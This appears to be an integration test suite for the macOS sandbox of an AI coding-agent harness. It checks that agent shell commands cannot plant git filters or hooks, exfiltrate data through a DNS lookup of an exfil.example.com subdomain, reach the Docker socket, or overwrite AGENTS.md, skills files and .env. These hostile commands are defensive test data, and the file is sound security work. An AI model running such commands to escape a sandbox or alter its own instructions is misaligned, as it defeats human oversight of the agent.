import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile, spawnSync } from 'node:child_process';
import { build } from 'esbuild';
import { existsSync, realpathSync } from 'node:fs';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { promisify } from 'node:util';
import { createServer } from 'node:http';
import { createHash } from 'node:crypto';

const temporary = await mkdtemp(join(tmpdir(), 'glitter-sandbox-integration-'));
const outdir = join(temporary, 'bundle');
await mkdir(outdir);
await build({
  entryPoints: {
    tools: resolve('packages/glitter-harness/src/harness/tools.ts'),
    mcp: resolve('packages/glitter-harness/src/harness/mcp.ts'),
    'mcp-config': resolve('packages/glitter-harness/src/harness/mcp-config.ts'),
    isolation: resolve('packages/glitter-harness/src/isolation.ts'),
  },
  outdir,
  bundle: true,
  platform: 'node',
  format: 'esm',
  logLevel: 'silent',
});
const [{ runTool, spawnShell }, { McpManager, mcpToolName }, { mcpConfigFingerprints }, { sandboxBackend, buildSeatbeltProfile, packageCacheRules, filterChildEnv }] = await Promise.all(
  ['tools', 'mcp', 'mcp-config', 'isolation'].map((name) => import(pathToFileURL(join(outdir, `${name}.js`)).href)),
);

/** Unsupported hosts skip explicitly; a real seatbelt failure is not a pass. */
function environmentSkip() {
  if (process.platform !== 'darwin') return 'macOS seatbelt integration requires darwin';
  if (!existsSync('/usr/bin/sandbox-exec')) return 'macOS sandbox-exec is unavailable';
  const probe = spawnSync('/usr/bin/sandbox-exec', ['-p', '(version 1)(allow default)', '/usr/bin/true'], { encoding: 'utf8', timeout: 8_000 });
  if (probe.status === 0) return null;
  const detail = `${probe.stderr ?? ''}`.split('\n').find(Boolean) ?? `exit ${probe.status}`;
  if (probe.error || /sandbox_apply: Operation not permitted/.test(detail)) return `macOS cannot apply a nested sandbox here: ${detail}`;
  throw new Error(`macOS seatbelt preflight failed: ${detail}`);
}

const integration = { skip: environmentSkip() ?? false, timeout: 20_000 };
const workspace = () => mkdtemp(join(temporary, 'workspace-'));
const exec = promisify(execFile);

// A fake home in temp would otherwise be writable through the ordinary temp
// allowance. Narrow it again, then apply the exact package rules production
// uses. This exercises a clean account without touching the user's caches.
const cacheProfile = (root, fakeHome, outside = []) => `${buildSeatbeltProfile([root])}\n${[fakeHome, ...outside].map((path) => `(deny file-write* (subpath ${JSON.stringify(realpathSync(path))}))`).join('\n')}\n${packageCacheRules(fakeHome)}`;

test('macOS seatbelt integration: F2.1 caches work on first use but config, binaries and symlink targets stay blocked', integration, async () => {
  const root = await workspace();
  const fakeHome = await mkdtemp(join(temporary, 'cache-home-'));
  const outside = await mkdtemp(join(temporary, 'cache-outside-'));
  const profile = cacheProfile(root, fakeHome, [outside]);
  const probe = (code, currentProfile = profile) => exec('/usr/bin/sandbox-exec', ['-p', currentProfile, process.execPath, '-e', code], { cwd: root, timeout: 8_000 });
  const caches = ['.npm', '.cargo/registry', '.cargo/git', '.gradle/caches', '.gradle/daemon', '.gradle/native', '.gradle/notifications', '.gradle/wrapper', '.m2/repository', 'go/pkg', '.bun/install/cache', '.yarn/berry/cache'];
  try {
    await probe(`
      const fs = require('node:fs'), path = require('node:path');
      for (const cache of ${JSON.stringify(caches)}) {
        const dir = path.join(${JSON.stringify(fakeHome)}, cache);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, 'proof'), 'cache-ok');
      }
    `);
    for (const cache of caches) assert.equal(await readFile(join(fakeHome, cache, 'proof'), 'utf8'), 'cache-ok');
    for (const file of ['.npmrc', '.cargo/config.toml', '.cargo/credentials.toml', '.cargo/bin/evil', '.gradle/gradle.properties', '.m2/settings.xml', 'go/bin/evil', '.bun/bin/evil', '.yarn/berry/config']) {
      await assert.rejects(probe(`const fs = require('node:fs'), path = require('node:path'), file = ${JSON.stringify(join(fakeHome, file))}; fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, 'forbidden')`), `${file} must not be writable`);
      assert.equal(existsSync(join(fakeHome, file)), false);
    }
    await assert.rejects(probe(`require('node:fs').renameSync(${JSON.stringify(join(fakeHome, '.cargo'))}, ${JSON.stringify(join(fakeHome, '.npm', 'moved-cargo'))})`), 'a parent cannot be renamed into a writable cache');
    await rm(join(fakeHome, '.npm'), { recursive: true });
    await symlink(outside, join(fakeHome, '.npm'));
    await rm(join(fakeHome, '.cargo'), { recursive: true });
    await symlink(outside, join(fakeHome, '.cargo'));
    const nextProfile = cacheProfile(root, fakeHome, [outside]);
    for (const file of ['.npm/escaped', '.cargo/registry/escaped']) {
      await assert.rejects(probe(`const fs = require('node:fs'), path = require('node:path'), file = ${JSON.stringify(join(fakeHome, file))}; fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, 'escaped')`, nextProfile), file);
    }
    assert.equal(existsSync(join(outside, 'escaped')), false);
    assert.equal(existsSync(join(outside, 'registry')), false);
  } finally {
    await rm(fakeHome, { recursive: true, force: true });
    await rm(outside, { recursive: true, force: true });
  }
});

async function npmFixture(root) {
  const pack = join(root, 'package');
  await mkdir(pack);
  await writeFile(join(pack, 'package.json'), JSON.stringify({ name: 'glitter-cache-fixture', version: '1.0.0', bin: { 'glitter-cache-fixture': 'server.cjs' } }));
  await writeFile(join(pack, 'server.cjs'), `#!/usr/bin/env node
const { createInterface } = require('node:readline');
createInterface({ input: process.stdin }).on('line', (line) => {
  const body = JSON.parse(line);
  if (body.id == null) return;
  const result = body.method === 'initialize'
    ? { protocolVersion: '2025-06-18', capabilities: { tools: {} }, serverInfo: { name: 'cache-fixture', version: '1.0.0' } }
    : body.method === 'tools/list'
      ? { tools: [{ name: 'echo', description: 'Echo a value', inputSchema: { type: 'object', properties: { text: { type: 'string' } } } }] }
      : { content: [{ type: 'text', text: String(body.params?.arguments?.text ?? '') }] };
  process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: body.id, result }) + '\\n');
});
`, { mode: 0o755 });
  const tarball = join(root, 'fixture.tgz');
  await exec('/usr/bin/tar', ['-czf', tarball, 'package'], { cwd: root, env: { ...process.env, COPYFILE_DISABLE: '1' } });
  return tarball;
}

test('macOS seatbelt integration: F2.1 npm installs a tarball with an empty home cache', integration, async () => {
  const root = await workspace();
  const fakeHome = await mkdtemp(join(temporary, 'npm-home-'));
  const tarball = await npmFixture(root);
  await writeFile(join(root, 'package.json'), JSON.stringify({ name: 'install-fixture', version: '1.0.0', private: true }));
  try {
    const env = { ...filterChildEnv(process.env), HOME: fakeHome };
    const args = ['/usr/bin/env', 'npm', 'install', '--offline', '--no-audit', '--no-fund', tarball];
    const before = `${buildSeatbeltProfile([root])}\n(deny file-write* (subpath ${JSON.stringify(realpathSync(fakeHome))}))`;
    await assert.rejects(exec('/usr/bin/sandbox-exec', ['-p', before, ...args], { cwd: root, env, timeout: 10_000 }), /EPERM|EACCES|operation not permitted/i, 'the previous cache policy refuses the install');
    const result = await exec('/usr/bin/sandbox-exec', ['-p', cacheProfile(root, fakeHome), ...args], { cwd: root, env, timeout: 10_000 });
    assert.match(result.stdout, /added 1 package/);
    assert.equal(existsSync(join(fakeHome, '.npm', '_cacache')), true, 'npm used its default cache');
    assert.equal(existsSync(join(root, 'node_modules', 'glitter-cache-fixture', 'server.cjs')), true);
  } finally {
    await rm(fakeHome, { recursive: true, force: true });
  }
});

const cargo = spawnSync('/usr/bin/which', ['cargo'], { encoding: 'utf8' }).stdout?.trim();
test('macOS seatbelt integration: F2.1 Cargo fetches a local dependency into an empty cache', { ...integration, skip: integration.skip || (!cargo && 'Cargo is not installed') }, async () => {
  const root = await workspace();
  const fakeHome = await mkdtemp(join(temporary, 'cargo-home-'));
  const source = await mkdtemp(join(temporary, 'cargo-source-'));
  await mkdir(join(source, 'src'));
  await writeFile(join(source, 'Cargo.toml'), '[package]\nname = "cache-dependency"\nversion = "1.0.0"\nedition = "2021"\n');
  await writeFile(join(source, 'src', 'lib.rs'), 'pub fn ready() {}\n');
  for (const args of [['init', '-q'], ['add', '.'], ['-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid', '-c', 'commit.gpgsign=false', '-c', 'core.hooksPath=/dev/null', 'commit', '-qm', 'fixture']]) {
    await exec('/usr/bin/git', args, { cwd: source });
  }
  await mkdir(join(root, 'src'));
  await writeFile(join(root, 'src', 'lib.rs'), 'pub fn ready() { cache_dependency::ready(); }\n');
  await writeFile(join(root, 'Cargo.toml'), `[package]\nname = "cache-consumer"\nversion = "1.0.0"\nedition = "2021"\n[dependencies]\ncache-dependency = { git = ${JSON.stringify(pathToFileURL(source).href)} }\n`);
  try {
    await exec('/usr/bin/sandbox-exec', ['-p', cacheProfile(root, fakeHome), cargo, 'fetch'], {
      cwd: root, env: { ...filterChildEnv(process.env), CARGO_HOME: join(fakeHome, '.cargo') }, timeout: 10_000,
    });
    assert.equal(existsSync(join(fakeHome, '.cargo', 'git', 'checkouts')), true);
    assert.equal(existsSync(join(root, 'Cargo.lock')), true);
    assert.equal(existsSync(join(fakeHome, '.cargo', 'config.toml')), false);
  } finally {
    await rm(fakeHome, { recursive: true, force: true });
    await rm(source, { recursive: true, force: true });
  }
});

test('macOS seatbelt integration: F2.1 Cargo downloads a registry crate and records its cache use', { ...integration, skip: integration.skip || (!cargo && 'Cargo is not installed') }, async () => {
  const root = await workspace();
  const fakeHome = await mkdtemp(join(temporary, 'cargo-registry-home-'));
  const pack = join(root, 'cache-dependency-1.0.0');
  await mkdir(join(pack, 'src'), { recursive: true });
  await writeFile(join(pack, 'Cargo.toml'), '[package]\nname = "cache-dependency"\nversion = "1.0.0"\nedition = "2021"\n');
  await writeFile(join(pack, 'src', 'lib.rs'), 'pub fn ready() {}\n');
  const tarball = join(root, 'dependency.crate');
  await exec('/usr/bin/tar', ['-czf', tarball, 'cache-dependency-1.0.0'], { cwd: root, env: { ...process.env, COPYFILE_DISABLE: '1' } });
  const archive = await readFile(tarball);
  const checksum = createHash('sha256').update(archive).digest('hex');
  const server = createServer((request, response) => {
    if (request.url === '/config.json') response.end(JSON.stringify({ dl: `http://127.0.0.1:${server.address().port}/download` }));
    else if (request.url === '/ca/ch/cache-dependency') response.end(JSON.stringify({ name: 'cache-dependency', vers: '1.0.0', deps: [], cksum: checksum, features: {}, yanked: false }) + '\n');
    else if (request.url === '/download/cache-dependency/1.0.0/download') response.end(archive);
    else { response.statusCode = 404; response.end(); }
  });
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  await mkdir(join(root, 'src'));
  await writeFile(join(root, 'src', 'lib.rs'), 'pub fn ready() { cache_dependency::ready(); }\n');
  await writeFile(join(root, 'Cargo.toml'), '[package]\nname = "registry-consumer"\nversion = "1.0.0"\nedition = "2021"\n[dependencies]\ncache-dependency = "=1.0.0"\n');
  await mkdir(join(root, '.cargo'));
  await writeFile(join(root, '.cargo', 'config.toml'), `[source.crates-io]\nreplace-with = "fixture"\n[source.fixture]\nregistry = "sparse+http://127.0.0.1:${server.address().port}/"\n`);
  try {
    await exec('/usr/bin/sandbox-exec', ['-p', cacheProfile(root, fakeHome), cargo, 'fetch'], {
      cwd: root, env: { ...filterChildEnv(process.env), CARGO_HOME: join(fakeHome, '.cargo') }, timeout: 10_000,
    }).catch((error) => { throw new Error(error.stderr || error.message); });
    assert.equal(existsSync(join(fakeHome, '.cargo', 'registry', 'cache')), true);
    assert.equal(existsSync(join(fakeHome, '.cargo', 'registry', 'src')), true);
    assert.equal(existsSync(join(root, 'Cargo.lock')), true);
    assert.equal(existsSync(join(fakeHome, '.cargo', '.package-cache')), true, 'Cargo can lock its shared package cache');
    assert.equal(existsSync(join(fakeHome, '.cargo', '.global-cache')), true, 'Cargo can save cache bookkeeping');
  } finally {
    server.closeAllConnections();
    await new Promise((done) => server.close(done));
    await rm(fakeHome, { recursive: true, force: true });
  }
});

test('macOS seatbelt integration: F2.1 an uncached npm-exec MCP launcher initializes and calls a tool', integration, async () => {
  const root = await workspace();
  const fakeHome = await mkdtemp(join(temporary, 'npx-home-'));
  const configHome = await mkdtemp(join(temporary, 'npx-config-'));
  const tarball = await npmFixture(root);
  await mkdir(join(root, '.glitter'));
  await writeFile(join(root, '.glitter', 'mcp.json'), JSON.stringify({ mcpServers: {
    cached: { command: '/usr/bin/env', args: ['npm', 'exec', '--offline', '--yes', '--package', tarball, '--', 'glitter-cache-fixture'], env: { HOME: fakeHome } },
  } }));
  const manager = new McpManager(configHome, () => {});
  const turn = { sessionId: 'cache-integration', turnId: 'turn-1', workspaceRoot: root, mode: 'build' };
  try {
    assert.equal(existsSync(join(fakeHome, '.npm')), false, 'the npm cache starts empty');
    await manager.ensure(root, { workspaceTrusted: true, ...await mcpConfigFingerprints(root, configHome) }, turn.sessionId);
    assert.deepEqual(manager.status(turn.sessionId), { servers: [{ name: 'cached', transport: 'stdio', tools: 1 }], error: null });
    const row = manager.acquire(turn)?.byName.get(mcpToolName('cached', 'echo'));
    assert.ok(row);
    const produced = await row.definition.run(root, { text: 'uncached-mcp-ok' });
    assert.match(produced.value.text, /uncached-mcp-ok/);
    assert.equal(existsSync(join(fakeHome, '.npm', '_npx')), true, 'the real npm launcher populated its cache');
  } finally {
    manager.release(turn);
    await manager.close();
    await rm(fakeHome, { recursive: true, force: true });
    await rm(configHome, { recursive: true, force: true });
  }
});

test('macOS seatbelt integration: the Harness shell runs as a sandbox process', integration, async () => {
  const root = await workspace();
  assert.equal(sandboxBackend(), 'seatbelt');
  const result = await runTool(root, 'bash', { command: 'printf shell-ok > shell-proof.txt && printf shell-ok' });
  assert.equal(result.exitCode, 0, result.output);
  assert.match(result.output, /shell-ok/);
  assert.equal(await readFile(join(root, 'shell-proof.txt'), 'utf8'), 'shell-ok');
});

test('macOS seatbelt integration: a stdio MCP server starts and answers as a sandbox process', integration, async () => {
  const root = await workspace();
  const home = await mkdtemp(join(temporary, 'home-'));
  const marker = join(root, 'mcp-started.txt');
  const scriptPath = join(root, 'echo-server.mjs');
  await writeFile(scriptPath, `
import { writeFileSync } from 'node:fs';
import { createInterface } from 'node:readline';
writeFileSync(${JSON.stringify(marker)}, 'started');
createInterface({ input: process.stdin }).on('line', (line) => {
  const body = JSON.parse(line);
  if (body.id == null) return;
  const result = body.method === 'initialize'
    ? { protocolVersion: '2025-06-18', capabilities: { tools: {} }, serverInfo: { name: 'sandbox-echo', version: '1.0.0' } }
    : body.method === 'tools/list'
      ? { tools: [{ name: 'echo', description: 'Echo one value', inputSchema: { type: 'object', properties: { text: { type: 'string' } } } }] }
      : { content: [{ type: 'text', text: String(body.params?.arguments?.text ?? '') }], isError: false };
  process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: body.id, result }) + '\\n');
});
`);
  await mkdir(join(root, '.glitter'));
  await writeFile(join(root, '.glitter', 'mcp.json'), JSON.stringify({ mcpServers: {
    echo: { command: process.execPath, args: [scriptPath] },
  } }));
  const manager = new McpManager(home, () => {});
  const turn = { sessionId: 'sandbox-integration', turnId: 'turn-1', workspaceRoot: root, mode: 'build' };
  try {
    const authorization = { workspaceTrusted: true, ...await mcpConfigFingerprints(root, home) };
    await manager.ensure(root, authorization, turn.sessionId);
    assert.equal(sandboxBackend(), 'seatbelt');
    assert.deepEqual(manager.status(turn.sessionId), { servers: [{ name: 'echo', transport: 'stdio', tools: 1 }], error: null });
    assert.equal(await readFile(marker, 'utf8'), 'started');
    const generation = manager.acquire(turn);
    const row = generation?.byName.get(mcpToolName('echo', 'echo'));
    assert.ok(row);
    const produced = await row.definition.run(root, { text: 'mcp-sandbox-ok' });
    assert.equal(produced.value.kind, 'mcp');
    assert.match(produced.value.text, /mcp-sandbox-ok/);
  } finally {
    manager.release(turn);
    await manager.close();
  }
});

test('macOS seatbelt integration: C1 the shell cannot plant git config, hooks or redirects, and git still commits', integration, async () => {
  const root = await workspace();
  const run = (command) => runTool(root, 'bash', { command });
  const ready = await run('git init -q');
  assert.notEqual(ready.exitCode, 0, 'the agent cannot create the root repository');
  const init = spawnSync('git', ['init', '-q'], { cwd: root });
  assert.equal(init.status, 0);
  for (const [key, value] of [['user.email', 't@example.com'], ['user.name', 'T'], ['commit.gpgsign', 'false']]) {
    spawnSync('git', ['config', key, value], { cwd: root });
  }
  const config = await readFile(join(root, '.git', 'config'), 'utf8');
  for (const command of [
    'git config filter.evil.clean "sh -c evil"',
    'printf "[core]\\n" >> .git/config',
    'printf x > .GIT/config',
    'mkdir -p .git/hooks && printf "#!/bin/sh\\n" > .git/hooks/pre-commit',
    'printf ../elsewhere > .git/commondir',
    'mv .git moved',
  ]) {
    const result = await run(command);
    assert.notEqual(result.exitCode, 0, `${command} was allowed: ${result.output}`);
  }
  assert.equal(await readFile(join(root, '.git', 'config'), 'utf8'), config);
  assert.equal(existsSync(join(root, '.git', 'hooks', 'pre-commit')), false);
  assert.equal(existsSync(join(root, '.git', 'commondir')), false);
  const commit = await run('printf one > a.txt && git add a.txt && git commit -qm one && git log --oneline');
  assert.equal(commit.exitCode, 0, commit.output);
  assert.match(commit.output, /one/);
  await run('rm -rf .git');
  assert.equal(await readFile(join(root, '.git', 'config'), 'utf8'), config, 'deleting the folder cannot take the config with it');
});

test('macOS seatbelt integration: C2 an offline command cannot resolve an outside name or reach a system socket', integration, async () => {
  const root = await workspace();
  const node = JSON.stringify(process.execPath);
  const probe = (code) => runTool(root, 'bash', { command: `${node} -e ${JSON.stringify(code)}` });
  const lookup = (name) => probe(`require('dns').lookup(${JSON.stringify(name)}, (error) => console.log(error ? error.code : 'resolved'))`);
  // Before the fix this printed "resolved": the resolver daemon answered through its socket.
  assert.match((await lookup('example.com')).output, /ENOTFOUND/, 'an outside name does not resolve');
  assert.match((await lookup('c2VjcmV0LWRhdGE.exfil.example.com')).output, /ENOTFOUND/, 'so data cannot leave as a hostname');
  assert.match((await lookup('localhost')).output, /resolved/, 'localhost still does, for dev servers');
  assert.match((await probe(`require('net').connect('/var/run/mDNSResponder').on('connect', () => console.log('connected')).on('error', (error) => console.log(error.code))`)).output, /EPERM/, 'the system resolver socket is refused');
  assert.match((await probe(`require('net').connect('/var/run/docker.sock').on('connect', () => console.log('connected')).on('error', (error) => console.log(error.code))`)).output, /EPERM|ENOENT/, 'and so is the Docker socket');
  // An approved online command is not narrowed: it asked for the network.
  const online = await runTool(root, 'bash', { command: `${node} -e ${JSON.stringify("require('dns').lookup('localhost', (error) => console.log(error ? error.code : 'resolved'))")}`, network: true }, undefined, { fullAccess: true });
  assert.match(online.output, /resolved/);
});

test('macOS seatbelt integration: M18 the shell cannot read the saved threads of any workspace', integration, async () => {
  const root = await workspace();
  const sessions = await mkdtemp(join(temporary, 'sessions-'));
  await writeFile(join(sessions, 'other-workspace.jsonl'), 'ANOTHER-PROJECTS-CONVERSATION');
  const previous = process.env.GLITTER_HARNESS_DIR;
  process.env.GLITTER_HARNESS_DIR = sessions;
  try {
    const read = await runTool(root, 'bash', { command: `cat ${JSON.stringify(join(sessions, 'other-workspace.jsonl'))}` });
    assert.notEqual(read.exitCode, 0);
    assert.doesNotMatch(read.output, /ANOTHER-PROJECTS-CONVERSATION/);
    const listing = await runTool(root, 'bash', { command: `ls ${JSON.stringify(sessions)}` });
    assert.doesNotMatch(listing.output, /other-workspace/, 'not even their names');
    const own = await runTool(root, 'bash', { command: 'printf fine > own.txt && cat own.txt' });
    assert.equal(own.exitCode, 0, 'the workspace itself is unaffected');
  } finally {
    if (previous === undefined) delete process.env.GLITTER_HARNESS_DIR; else process.env.GLITTER_HARNESS_DIR = previous;
  }
});

test('macOS seatbelt integration: H8 the shell cannot write protected files, and node_modules stays writable', integration, async () => {
  const root = await workspace();
  await mkdir(join(root, '.glitter', 'skills'), { recursive: true });
  await writeFile(join(root, 'AGENTS.md'), 'rules\n');
  const run = (command) => runTool(root, 'bash', { command });
  for (const command of [
    'printf x >> AGENTS.md', 'printf x > agents.md', 'mkdir -p pkg && printf x > pkg/CLAUDE.md',
    'mkdir -p .glitter/skills/evil && printf x > .glitter/skills/evil/SKILL.md', 'mv .glitter moved',
    'printf x > .env', 'mkdir -p apps/web && printf x > apps/web/.env.local', 'printf x > .envrc', 'printf x > dev.pem',
    'ln AGENTS.md copy.md',
  ]) {
    const result = await run(command);
    assert.notEqual(result.exitCode, 0, `${command} was allowed: ${result.output}`);
  }
  assert.equal(await readFile(join(root, 'AGENTS.md'), 'utf8'), 'rules\n');
  assert.equal(existsSync(join(root, '.env')), false);
  const allowed = await run('mkdir -p node_modules/pkg && printf x > node_modules/pkg/.env && printf y > notes.txt && cat .env.example 2>/dev/null; true');
  assert.equal(allowed.exitCode, 0, allowed.output);
  assert.equal(await readFile(join(root, 'node_modules', 'pkg', '.env'), 'utf8'), 'x');

  const custom = spawnShell(root, 'printf x > .env && printf y > config.txt', false, ['config.txt']);
  const code = await new Promise((done) => custom.child.on('exit', done));
  assert.notEqual(code, 0, 'the given set replaces the defaults');
  assert.equal(await readFile(join(root, '.env'), 'utf8'), 'x');
  assert.equal(existsSync(join(root, 'config.txt')), false);
});
